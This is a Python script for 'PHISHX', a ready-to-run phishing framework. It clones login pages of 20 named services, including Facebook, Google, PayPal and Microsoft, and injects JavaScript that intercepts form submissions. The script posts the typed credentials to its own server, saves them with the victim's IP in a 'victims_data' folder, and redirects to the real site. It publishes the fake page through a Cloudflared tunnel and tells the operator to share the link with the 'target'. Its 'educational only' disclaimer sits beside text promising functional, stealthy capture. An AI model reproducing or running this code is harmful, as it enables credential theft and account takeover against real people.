#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHISHX v1.0.0 - Universal Phishing Framework
Author: zennx - https://github.com/zeennxx
Compatibility: Windows/Linux/macOS/Termux/Android
==========================================================================
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

    PHISHX - Advanced Phishing Framework
    Copyright (C) 2026  zennx (https://github.com/zeennxx)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

==========================================================================
DISCLAIMER:
This tool is for educational/demonstration purposes only.
Usage is at your own risk. Author not liable for any misuse.
By using this software, you agree to the terms of GPL-3.0 License.
==========================================================================
"""

import os
import sys
import time
import json
import socket
import random
import string
import base64
import hashlib
import threading
import subprocess
import webbrowser
import requests
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote
import ssl
import shutil
import re
import platform

# ==================== CONFIGURATION ====================
VERSION = "1.0.0"
AUTHOR = "zennx"
GITHUB = "https://github.com/zeennxx"
CONFIG = {
    "port": 8080,
    "ssl_port": 8443,
    "max_threads": 50,
    "timeout": 30,
    "retry_count": 3,
    "backup_dir": "victims_data",
    "template_dir": "templates",
    "cloned_dir": "cloned_sites",
    "log_file": "phishx.log",
    "auto_recovery": True,
    "universal_mode": True
}

# ==================== LOGO & UI ====================
MAIN_LOGO = """
\033[1;36m
 ███████████  █████   █████ █████  █████████  █████   █████ █████ █████
 ░███░░░░░███░░███   ░░███ ░░███  ███░░░░░███░░███   ░░███ ░░███ ░░███ 
 ░███    ░███ ░███    ░███  ░███ ░███    ░░░  ░███    ░███  ░░███ ███  
 ░██████████  ░███████████  ░███ ░░█████████  ░███████████   ░░█████   
 ░███░░░░░░   ░███░░░░░███  ░███  ░░░░░░░░███ ░███░░░░░███    ███░███  
 ░███         ░███    ░███  ░███  ███    ░███ ░███    ░███   ███ ░░███ 
 █████        █████   █████ █████░░█████████  █████   █████ █████ █████
 ░░░░░        ░░░░░   ░░░░░ ░░░░░  ░░░░░░░░░  ░░░░░   ░░░░░ ░░░░░ ░░░░░ 
\033[0m
\033[1;33m╔══════════════════════════════════════════════════════════════╗
║              PHISHX v1.0 - UNIVERSAL EDITION               ║
║                    Author: zennx                            ║
║              https://github.com/zeennxx                     ║
╚══════════════════════════════════════════════════════════════╝\033[0m
"""

LINK_LOGO = """
\033[1;32m
░█▀█░█░█░▀█▀░█▀▀░█░█░█░█
░█▀▀░█▀█░░█░░▀▀█░█▀█░▄▀▄
░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀░▀
\033[0m
\033[1;33m══════════════════════════════════════\033[0m
"""

# ==================== TEMPLATE DATABASE ====================
TEMPLATES = {
    "1": {
        "name": "Facebook Login",
        "url": "https://facebook.com",
        "fields": ["email", "pass"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://facebook.com",
        "description": "Facebook login page clone. Captures email and password."
    },
    "2": {
        "name": "Instagram Login",
        "url": "https://instagram.com",
        "fields": ["username", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://instagram.com",
        "description": "Instagram login page clone. Captures username and password."
    },
    "3": {
        "name": "Google Account",
        "url": "https://accounts.google.com",
        "fields": ["email", "pass"],
        "type": "email",
        "cloneable": True,
        "redirect": "https://google.com",
        "description": "Google login page with two-step flow."
    },
    "4": {
        "name": "Twitter/X Login",
        "url": "https://twitter.com",
        "fields": ["text", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://twitter.com",
        "description": "Twitter/X login page clone."
    },
    "5": {
        "name": "LinkedIn Login",
        "url": "https://linkedin.com",
        "fields": ["session_key", "session_password"],
        "type": "professional",
        "cloneable": True,
        "redirect": "https://linkedin.com",
        "description": "LinkedIn professional login page."
    },
    "6": {
        "name": "GitHub Login",
        "url": "https://github.com/login",
        "fields": ["login", "password"],
        "type": "dev",
        "cloneable": True,
        "redirect": "https://github.com",
        "description": "GitHub developer login page."
    },
    "7": {
        "name": "Microsoft Login",
        "url": "https://login.live.com",
        "fields": ["loginfmt", "passwd"],
        "type": "email",
        "cloneable": True,
        "redirect": "https://outlook.com",
        "description": "Microsoft/Outlook enterprise login."
    },
    "8": {
        "name": "Netflix Login",
        "url": "https://netflix.com/login",
        "fields": ["userLoginId", "password"],
        "type": "streaming",
        "cloneable": True,
        "redirect": "https://netflix.com",
        "description": "Netflix streaming login page."
    },
    "9": {
        "name": "Spotify Login",
        "url": "https://accounts.spotify.com",
        "fields": ["username", "password"],
        "type": "music",
        "cloneable": True,
        "redirect": "https://spotify.com",
        "description": "Spotify music service login."
    },
    "10": {
        "name": "Amazon Login",
        "url": "https://amazon.com/ap/signin",
        "fields": ["email", "password"],
        "type": "ecommerce",
        "cloneable": True,
        "redirect": "https://amazon.com",
        "description": "Amazon e-commerce login page."
    },
    "11": {
        "name": "Apple ID",
        "url": "https://appleid.apple.com",
        "fields": ["accountName", "password"],
        "type": "tech",
        "cloneable": True,
        "redirect": "https://apple.com",
        "description": "Apple ID minimalist login."
    },
    "12": {
        "name": "PayPal Login",
        "url": "https://paypal.com/signin",
        "fields": ["email", "password"],
        "type": "finance",
        "cloneable": True,
        "redirect": "https://paypal.com",
        "description": "PayPal financial login."
    },
    "13": {
        "name": "Discord Login",
        "url": "https://discord.com/login",
        "fields": ["email", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://discord.com",
        "description": "Discord dark theme login."
    },
    "14": {
        "name": "Telegram Web",
        "url": "https://web.telegram.org",
        "fields": ["phone", "password"],
        "type": "messaging",
        "cloneable": True,
        "redirect": "https://web.telegram.org",
        "description": "Telegram Web messaging login."
    },
    "15": {
        "name": "WhatsApp Web",
        "url": "https://web.whatsapp.com",
        "fields": ["qr_scan"],
        "type": "messaging",
        "cloneable": True,
        "redirect": "https://web.whatsapp.com",
        "description": "WhatsApp Web QR code login."
    },
    "16": {
        "name": "Snapchat Login",
        "url": "https://accounts.snapchat.com",
        "fields": ["username", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://snapchat.com",
        "description": "Snapchat multimedia login."
    },
    "17": {
        "name": "TikTok Login",
        "url": "https://tiktok.com/login",
        "fields": ["username", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://tiktok.com",
        "description": "TikTok video platform login."
    },
    "18": {
        "name": "Reddit Login",
        "url": "https://reddit.com/login",
        "fields": ["username", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://reddit.com",
        "description": "Reddit community login."
    },
    "19": {
        "name": "Pinterest Login",
        "url": "https://pinterest.com/login",
        "fields": ["id", "password"],
        "type": "social",
        "cloneable": True,
        "redirect": "https://pinterest.com",
        "description": "Pinterest visual discovery login."
    },
    "20": {
        "name": "Yahoo Login",
        "url": "https://login.yahoo.com",
        "fields": ["username", "password"],
        "type": "email",
        "cloneable": True,
        "redirect": "https://yahoo.com",
        "description": "Yahoo mail service login."
    }
}

# ==================== UNIVERSAL COMPATIBILITY ====================
class CompatibilityLayer:
    """Ensures PHISHX runs on any platform"""
    
    @staticmethod
    def detect_platform():
        """Detect current platform"""
        system = platform.system().lower()
        if 'linux' in system:
            if 'android' in platform.platform().lower() or 'termux' in os.environ.get('PREFIX', ''):
                return 'termux'
            return 'linux'
        elif 'windows' in system:
            return 'windows'
        elif 'darwin' in system:
            return 'macos'
        return 'unknown'
    
    @staticmethod
    def get_temp_dir():
        """Get platform-specific temp directory"""
        platform = CompatibilityLayer.detect_platform()
        if platform == 'termux':
            return '/data/data/com.termux/files/home/tmp'
        elif platform == 'windows':
            return os.environ.get('TEMP', 'C:\\Windows\\Temp')
        else:
            return '/tmp'
    
    @staticmethod
    def get_download_command(url, output):
        """Get platform-specific download command"""
        platform = CompatibilityLayer.detect_platform()
        if platform == 'windows':
            return f'powershell -Command "Invoke-WebRequest -Uri {url} -OutFile {output}"'
        else:
            return f'wget -q {url} -O {output}'
    
    @staticmethod
    def check_dependency(name):
        """Check if dependency exists cross-platform"""
        platform = CompatibilityLayer.detect_platform()
        if platform == 'windows':
            result = subprocess.run(['where', name], capture_output=True, shell=True)
        else:
            result = subprocess.run(['which', name], capture_output=True)
        return result.returncode == 0
    
    @staticmethod
    def clear_screen():
        """Clear screen on any platform"""
        platform = CompatibilityLayer.detect_platform()
        if platform == 'windows':
            os.system('cls')
        else:
            os.system('clear')

# ==================== CLONING ENGINE ====================
class SiteCloner:
    """Advanced website cloning engine"""
    
    @staticmethod
    def clone_site(url, template_name):
        """Clone website with all assets"""
        try:
            print(f"\033[1;34m[*] Cloning {url}...\033[0m")
            
            clone_dir = os.path.join(CONFIG["cloned_dir"], template_name)
            os.makedirs(clone_dir, exist_ok=True)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(url, headers=headers, timeout=CONFIG["timeout"])
            html_content = response.text
            
            SiteCloner._download_assets(html_content, url, clone_dir)
            html_content = SiteCloner._inject_capture(html_content, url)
            
            with open(os.path.join(clone_dir, "index.html"), "w", encoding="utf-8") as f:
                f.write(html_content)
            
            print(f"\033[1;32m[✓] Clone completed: {template_name}\033[0m")
            return True
            
        except Exception as e:
            print(f"\033[1;31m[!] Clone failed: {e}\033[0m")
            return False
    
    @staticmethod
    def _download_assets(html, base_url, clone_dir):
        """Download all assets"""
        patterns = [
            (r'<link[^>]+href="([^"]+)"', "css"),
            (r'<script[^>]+src="([^"]+)"', "js"),
            (r'<img[^>]+src="([^"]+)"', "images"),
            (r'url\(["\']?([^"\'\)]+)["\']?\)', "assets")
        ]
        
        for pattern, folder in patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                try:
                    asset_url = match
                    if asset_url.startswith('//'):
                        asset_url = 'https:' + asset_url
                    elif asset_url.startswith('/'):
                        parsed = urlparse(base_url)
                        asset_url = f"{parsed.scheme}://{parsed.netloc}{asset_url}"
                    elif not asset_url.startswith(('http://', 'https://')):
                        asset_url = base_url.rstrip('/') + '/' + asset_url
                    
                    asset_response = requests.get(asset_url, timeout=5)
                    if asset_response.status_code == 200:
                        asset_path = os.path.join(clone_dir, folder, os.path.basename(asset_url))
                        os.makedirs(os.path.dirname(asset_path), exist_ok=True)
                        
                        with open(asset_path, 'wb') as f:
                            f.write(asset_response.content)
                            
                except Exception:
                    continue
    
    @staticmethod
    def _inject_capture(html, original_url):
        """Inject capture script"""
        capture_script = f"""
        <script>
        (function() {{
            document.addEventListener('DOMContentLoaded', function() {{
                var forms = document.getElementsByTagName('form');
                for(var i = 0; i < forms.length; i++) {{
                    forms[i].addEventListener('submit', function(e) {{
                        e.preventDefault();
                        
                        var formData = {{}};
                        var inputs = this.getElementsByTagName('input');
                        for(var j = 0; j < inputs.length; j++) {{
                            if(inputs[j].name) {{
                                formData[inputs[j].name] = inputs[j].value;
                            }}
                        }}
                        
                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', '/capture', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.onload = function() {{
                            window.location.href = '{original_url}';
                        }};
                        xhr.send(JSON.stringify(formData));
                    }});
                }}
            }});
        }})();
        </script>
        """
        
        if '</body>' in html:
            html = html.replace('</body>', capture_script + '</body>')
        else:
            html += capture_script
            
        return html

# ==================== TUNNELING ENGINE ====================
class TunnelManager:
    """Universal tunneling for all platforms"""
    
    @staticmethod
    def start_cloudflared(port):
        """Start Cloudflared tunnel (cross-platform)"""
        try:
            print(f"\033[1;34m[*] Starting Cloudflared tunnel...\033[0m")
            
            platform = CompatibilityLayer.detect_platform()
            cloudflared_path = 'cloudflared'
            
            if not CompatibilityLayer.check_dependency('cloudflared'):
                print(f"\033[1;33m[!] Cloudflared not found, downloading...\033[0m")
                
                if platform == 'windows':
                    url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
                    output = 'cloudflared.exe'
                elif platform == 'termux' or platform == 'android':
                    url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
                    output = 'cloudflared'
                elif platform == 'macos':
                    url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64'
                    output = 'cloudflared'
                else:  # linux
                    url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
                    output = 'cloudflared'
                
                cmd = CompatibilityLayer.get_download_command(url, output)
                os.system(cmd)
                
                if platform != 'windows':
                    os.system(f'chmod +x {output}')
                
                cloudflared_path = output
            
            # Start tunnel
            if platform == 'windows':
                process = subprocess.Popen(
                    [cloudflared_path, 'tunnel', '--url', f'http://localhost:{port}'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
            else:
                process = subprocess.Popen(
                    [f'./{cloudflared_path}' if cloudflared_path == 'cloudflared' else cloudflared_path, 
                     'tunnel', '--url', f'http://localhost:{port}'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            
            time.sleep(3)
            for line in process.stderr:
                if 'https://' in line:
                    url = line.split('https://')[1].split()[0]
                    return f"https://{url}"
                    
        except Exception as e:
            print(f"\033[1;31m[!] Tunnel failed: {e}\033[0m")
            return None

# ==================== PHISHING SERVER ====================
class PhishingHandler(BaseHTTPRequestHandler):
    """Universal HTTP Handler"""
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            if self.path.startswith('/clones/'):
                clone_name = self.path.split('/')[2]
                clone_dir = os.path.join(CONFIG["cloned_dir"], clone_name)
                file_path = clone_dir + self.path.replace(f'/clones/{clone_name}', '')
                
                if not file_path.endswith('/') and not os.path.exists(file_path):
                    file_path = os.path.join(clone_dir, 'index.html')
            else:
                self.send_response(302)
                self.send_header('Location', '/menu')
                self.end_headers()
                return
            
            if os.path.exists(file_path):
                self.send_response(200)
                if file_path.endswith('.html'):
                    self.send_header('Content-type', 'text/html')
                elif file_path.endswith('.css'):
                    self.send_header('Content-type', 'text/css')
                elif file_path.endswith('.js'):
                    self.send_header('Content-type', 'application/javascript')
                elif file_path.endswith(('.png', '.jpg', '.jpeg', '.gif', '.ico')):
                    self.send_header('Content-type', 'image/' + file_path.split('.')[-1])
                self.end_headers()
                
                with open(file_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, "File not found")
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode())
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            victim_ip = self.client_address[0]
            
            victim_data = {
                "timestamp": timestamp,
                "ip": victim_ip,
                "user_agent": self.headers.get('User-Agent', ''),
                "data": data
            }
            
            os.makedirs(CONFIG["backup_dir"], exist_ok=True)
            filename = f"{CONFIG['backup_dir']}/victim_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(victim_data, f, indent=2)
            
            print(f"\033[1;32m[+] Data captured from {victim_ip} at {timestamp}\033[0m")
            print(f"\033[1;33m[>] Saved to: {filename}\033[0m")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()

# ==================== CLI MENU SYSTEM ====================
class MenuSystem:
    """Universal menu system"""
    
    @staticmethod
    def clear_screen():
        CompatibilityLayer.clear_screen()
    
    @staticmethod
    def print_header():
        MenuSystem.clear_screen()
        print(MAIN_LOGO)
        print("\033[1;37m" + "="*60 + "\033[0m")
    
    @staticmethod
    def show_main_menu():
        MenuSystem.print_header()
        print("\n\033[1;36m[ PHISHX MAIN MENU ]\033[0m\n")
        print("\033[1;33m1.\033[0m \033[1;37mStart Phishing\033[0m - Select template and generate link")
        print("\033[1;33m2.\033[0m \033[1;37mView All Templates\033[0m - Complete list with descriptions")
        print("\033[1;33m3.\033[0m \033[1;37mAbout Tool\033[0m - Information about PHISHX")
        print("\033[1;33m4.\033[0m \033[1;37mDisclaimer\033[0m - Important information")
        print("\033[1;33m5.\033[0m \033[1;37mExit\033[0m - Exit PHISHX\n")
        print("\033[1;36m" + "-"*60 + "\033[0m")
        
        choice = input("\n\033[1;32m[?] Select menu (1-5): \033[0m")
        return choice.strip()
    
    @staticmethod
    def show_templates_list():
        MenuSystem.print_header()
        print("\n\033[1;36m[ 20 PREMIUM TEMPLATES ]\033[0m\n")
        
        for key, template in TEMPLATES.items():
            print(f"\033[1;33m{key}.\033[0m \033[1;37m{template['name']}\033[0m")
            print(f"   \033[1;30mOriginal URL: {template['url']}\033[0m")
            print(f"   \033[1;32mDescription: {template['description']}\033[0m")
            print(f"   \033[1;35mType: {template['type'].upper()} | Fields: {', '.join(template['fields'])}\033[0m\n")
        
        input("\n\033[1;33m[>] Press Enter to return to main menu...\033[0m")
    
    @staticmethod
    def show_about():
        MenuSystem.print_header()
        print("\n\033[1;36m[ ABOUT PHISHX ]\033[0m\n")
        print(f"\033[1;37mTool Name:\033[0m PHISHX v{VERSION}")
        print(f"\033[1;37mAuthor:\033[0m {AUTHOR}")
        print(f"\033[1;37mGitHub:\033[0m {GITHUB}")
        print(f"\033[1;37mCreated:\033[0m January 2026")
        print(f"\033[1;37mPlatform Support:\033[0m Windows, Linux, macOS, Termux, Android")
        print(f"\033[1;37mFeatures:\033[0m")
        print("  • 20 Premium Templates (Live Clone)")
        print("  • 100% Identical Original Appearance")
        print("  • Auto Tunneling (Cloudflared)")
        print("  • Universal Compatibility")
        print("  • Stealth Data Capture")
        print("  • Auto-Recovery System")
        print(f"\n\033[1;37mTechnologies:\033[0m Python 3, HTML5, CSS3, JavaScript")
        print(f"\033[1;37mLicense:\033[0m Private / Internal Use Only")
        print(f"\n\033[1;33m[>] GitHub: {GITHUB}\033[0m\n")
        
        input("\n\033[1;33m[>] Press Enter to return to main menu...\033[0m")
    
    @staticmethod
    def show_disclaimer():
        MenuSystem.print_header()
        print("\n\033[1;36m[ DISCLAIMER & IMPORTANT INFORMATION ]\033[0m\n")
        
        print("\033[1;31m" + "="*60 + "\033[0m")
        print("\033[1;33mNOTICE:\033[0m")
        print("\033[1;37mThis tool is for DEMO / TESTING purposes\033[0m")
        print("\033[1;31m" + "="*60 + "\033[0m\n")
        
        print("\033[1;37mPHISHX is an advanced phishing framework that:\033[0m")
        print("✓ Generates phishing links with 100% original appearance")
        print("✓ Clones original websites in real-time")
        print("✓ Captures login data stealthily")
        print("✓ Redirects to original site after capture\n")
        
        print("\033[1;33m⚠️  DEMO STATUS:\033[0m")
        print("• This tool is in testing phase")
        print("• All features are functional")
        print("• Phishing links active while server runs")
        print("• Data saved in victims_data folder\n")
        
        print("\033[1;31m🔴 LEGAL DISCLAIMER:\033[0m")
        print("Usage of this tool is outside author's responsibility.")
        print("For security testing and demonstration purposes only.")
        print("Author not liable for any misuse.\n")
        
        print("\033[1;32m✅ WHAT YOU GET:\033[0m")
        print("• Functional phishing links")
        print("• Original-looking pages")
        print("• Captured data in victims_data/")
        print("• Public URL via tunnel\n")
        
        print("\033[1;36m📌 NOTES:\033[0m")
        print("• Run on VPS/termux for best results")
        print("• Ensure port 8080 is available")
        print("• Cloudflared auto-downloads if missing\n")
        
        input("\n\033[1;33m[>] Press Enter to return to main menu...\033[0m")
    
    @staticmethod
    def start_phishing():
        MenuSystem.print_header()
        print("\n\033[1;36m[ START PHISHING ]\033[0m\n")
        
        print("\033[1;37mAvailable templates:\033[0m\n")
        for key, template in TEMPLATES.items():
            print(f"\033[1;33m{key}.\033[0m {template['name']}")
        
        print(f"\033[1;33m21.\033[0m \033[1;32mCustom Clone (enter your own URL)\033[0m")
        
        choice = input("\n\033[1;32m[?] Select template number (1-21): \033[0m")
        
        if choice == "21":
            url = input("\n\033[1;32m[?] Enter target URL (example: https://example.com): \033[0m")
            name = input("\033[1;32m[?] Name for this template: \033[0m")
            
            print(f"\n\033[1;34m[*] Starting clone for {url}...\033[0m")
            SiteCloner.clone_site(url, name.replace(' ', '_'))
            
            template_name = name.replace(' ', '_')
        else:
            if choice in TEMPLATES:
                template = TEMPLATES[choice]
                template_name = template['name'].replace(' ', '_')
                
                print(f"\n\033[1;34m[*] Checking template {template['name']}...\033[0m")
                
                clone_path = os.path.join(CONFIG["cloned_dir"], template_name)
                if not os.path.exists(clone_path):
                    SiteCloner.clone_site(template['url'], template_name)
                else:
                    print(f"\033[1;32m[✓] Template ready\033[0m")
            else:
                print("\n\033[1;31m[!] Invalid choice!\033[0m")
                time.sleep(2)
                return
        
        print(f"\n\033[1;34m[*] Starting server...\033[0m")
        
        server_thread = threading.Thread(target=start_phishing_server, args=(template_name,))
        server_thread.daemon = True
        server_thread.start()
        
        time.sleep(2)
        
        print(LINK_LOGO)
        print(f"\n\033[1;32m[✓] SERVER READY!\033[0m\n")
        print(f"\033[1;37mLocal Phishing Link:\033[0m \033[1;36mhttp://localhost:{CONFIG['port']}/clones/{template_name}\033[0m")
        
        tunnel_url = TunnelManager.start_cloudflared(CONFIG["port"])
        if tunnel_url:
            print(f"\033[1;37mPublic Link (Tunnel):\033[0m \033[1;32m{tunnel_url}/clones/{template_name}\033[0m\n")
            print(f"\033[1;33m⚠️  Share this PUBLIC link with target\033[0m")
        
        print(f"\n\033[1;37mCaptured data will be saved in:\033[0m \033[1;33m{CONFIG['backup_dir']}\033[0m")
        print(f"\n\033[1;31m[!] Press Ctrl+C to stop server and return to menu\033[0m\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\033[1;33m[*] Returning to main menu...\033[0m")
            time.sleep(1)

# Global server variable
phishing_server = None

def start_phishing_server(template_name):
    """Start phishing server in background"""
    global phishing_server
    
    class CustomHandler(PhishingHandler):
        def do_GET(self):
            if self.path == '/':
                self.send_response(302)
                self.send_header('Location', f'/clones/{template_name}')
                self.end_headers()
            else:
                super().do_GET()
    
    server = HTTPServer(('0.0.0.0', CONFIG["port"]), CustomHandler)
    phishing_server = server
    server.serve_forever()

# ==================== SELF-VALIDATION ====================
class SelfValidator:
    """Universal validation system"""
    
    @staticmethod
    def validate_environment():
        checks = {
            "Python version": sys.version_info >= (3, 6),
            "Port availability": not SelfValidator._is_port_in_use(CONFIG["port"]),
            "Write permission": os.access('.', os.W_OK),
            "Dependencies": SelfValidator._check_dependencies(),
            "Platform support": CompatibilityLayer.detect_platform() != 'unknown'
        }
        
        all_passed = all(checks.values())
        return all_passed, checks
    
    @staticmethod
    def _is_port_in_use(port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0
    
    @staticmethod
    def _check_dependencies():
        required = ['requests']
        for dep in required:
            try:
                __import__(dep)
            except ImportError:
                return False
        return True

# ==================== MAIN APPLICATION ====================
class PhishX:
    """Main PHISHX Application"""
    
    def __init__(self):
        self.running = True
        self.platform = CompatibilityLayer.detect_platform()
        
    def initialize(self):
        """Initialize all components"""
        print(MAIN_LOGO)
        print(f"\033[1;34m[*] Initializing PHISHX v{VERSION}...\033[0m")
        print(f"\033[1;34m[*] Detected platform: {self.platform.upper()}\033[0m")
        
        valid, checks = SelfValidator.validate_environment()
        if not valid:
            print("\033[1;31m[!] Environment validation failed:\033[0m")
            for check, passed in checks.items():
                status = "✓" if passed else "✗"
                color = "\033[1;32m" if passed else "\033[1;31m"
                print(f"{color}  [{status}] {check}\033[0m")
            return False
        
        print("\033[1;32m[✓] Environment validated\033[0m")
        
        os.makedirs(CONFIG["template_dir"], exist_ok=True)
        os.makedirs(CONFIG["cloned_dir"], exist_ok=True)
        os.makedirs(CONFIG["backup_dir"], exist_ok=True)
        
        return True
    
    def prepare_templates(self):
        """Prepare all templates"""
        print(f"\033[1;34m[*] Preparing 20 templates...\033[0m")
        
        for key, template in TEMPLATES.items():
            if template["cloneable"]:
                clone_name = template["name"].replace(' ', '_')
                clone_path = os.path.join(CONFIG["cloned_dir"], clone_name)
                
                if not os.path.exists(clone_path):
                    print(f"\033[1;33m[~] Cloning {template['name']}...\033[0m")
                    SiteCloner.clone_site(template["url"], clone_name)
                else:
                    print(f"\033[1;32m[✓] {template['name']} ready\033[0m")
    
    def run(self):
        """Main execution loop"""
        if not self.initialize():
            input("\n\033[1;31m[!] Press Enter to exit...\033[0m")
            return
        
        self.prepare_templates()
        
        while self.running:
            choice = MenuSystem.show_main_menu()
            
            if choice == "1":
                MenuSystem.start_phishing()
            elif choice == "2":
                MenuSystem.show_templates_list()
            elif choice == "3":
                MenuSystem.show_about()
            elif choice == "4":
                MenuSystem.show_disclaimer()
            elif choice == "5":
                print(f"\n\033[1;33m[*] Thank you for using PHISHX!\033[0m")
                print(f"\033[1;32m[*] Author: {AUTHOR} - {GITHUB}\033[0m\n")
                self.running = False
            else:
                print(f"\n\033[1;31m[!] Invalid choice! Please select 1-5.\033[0m")
                time.sleep(2)

# ==================== AUTO-RECOVERY SYSTEM ====================
class AutoRecovery(threading.Thread):
    """Universal auto-recovery system"""
    
    def __init__(self, app):
        super().__init__()
        self.app = app
        self.daemon = True
    
    def run(self):
        while self.app.running:
            time.sleep(30)
            
            global phishing_server
            if phishing_server and not hasattr(phishing_server, 'fileno'):
                print(f"\033[1;33m[!] Server recovery needed\033[0m")

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    try:
        # Install requests if missing (universal)
        try:
            import requests
        except ImportError:
            print("\033[1;33m[!] Installing requests module...\033[0m")
            platform = CompatibilityLayer.detect_platform()
            if platform == 'windows':
                os.system('pip install requests')
            else:
                os.system('pip3 install requests || pip install requests')
            time.sleep(2)
        
        # Clear screen
        CompatibilityLayer.clear_screen()
        
        # Start application
        app = PhishX()
        
        # Start auto-recovery
        recovery = AutoRecovery(app)
        recovery.start()
        
        # Run main app
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n\n\033[1;33m[*] PHISHX terminated by user\033[0m")
        print(f"\033[1;32m[*] Author: {AUTHOR} - {GITHUB}\033[0m\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[1;31m[!] Fatal error: {e}\033[0m")
        sys.exit(1)